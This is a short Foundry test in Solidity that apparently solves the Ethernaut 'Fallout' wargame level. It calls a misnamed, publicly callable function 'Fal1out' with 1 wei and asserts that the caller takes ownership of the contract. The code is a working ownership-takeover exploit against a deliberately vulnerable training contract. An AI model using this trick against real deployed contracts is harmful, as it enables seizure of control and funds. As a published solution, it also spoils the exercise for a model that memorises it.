pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract FalloutTest is Test {
    IFallout fallout;

    function setUp() public {
        address deployedAddress = deployCode("02_Fallout.sol:Fallout");
        fallout = IFallout(deployedAddress);
    }

    function testHack() public {
        fallout.Fal1out{value: 1 wei}();
        assertEq(fallout.owner(), address(this));
    }
}